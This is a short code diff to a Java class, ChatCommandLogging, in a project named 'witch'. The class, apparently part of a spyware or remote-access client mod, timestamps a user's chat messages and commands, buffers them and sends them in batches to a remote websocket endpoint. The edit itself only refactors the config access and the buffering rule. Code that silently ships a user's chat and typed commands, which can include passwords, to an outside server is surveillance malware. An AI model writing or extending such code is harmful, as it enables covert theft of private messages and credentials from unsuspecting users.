@@ -1,5 +1,6 @@
 package me.soda.witch.features;
 
+import me.soda.witch.Witch;
 import me.soda.witch.websocket.MessageUtils;
 
 import java.time.LocalDateTime;
@@ -17,7 +18,7 @@ public class ChatCommandLogging {
             } catch (InterruptedException e) {
                 e.printStackTrace();
             }
-            if (Config.logChatAndCommand && !readyToSendStrings.isEmpty()) {
+            if (Witch.config.logChatAndCommand && !readyToSendStrings.isEmpty()) {
                 MessageUtils.sendMessage("logging", String.join("\n", readyToSendStrings) + "\n");
                 readyToSendStrings = new ArrayList<>();
             }
@@ -26,9 +27,9 @@ public class ChatCommandLogging {
 
     public static void addToList(String msg) {
         String time = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss "));
-        if (readyToSendStrings.size() < 10 || msg.length() < 100) {
+        if (readyToSendStrings.size() < 10) {
             readyToSendStrings.add(time + msg);
-        } else readyToSendStrings.add(time + "TOO MANY PACKETS OR MESSAGE TOO BIG");
+        } else readyToSendStrings.add("TooManyPackets");
 
 
     }
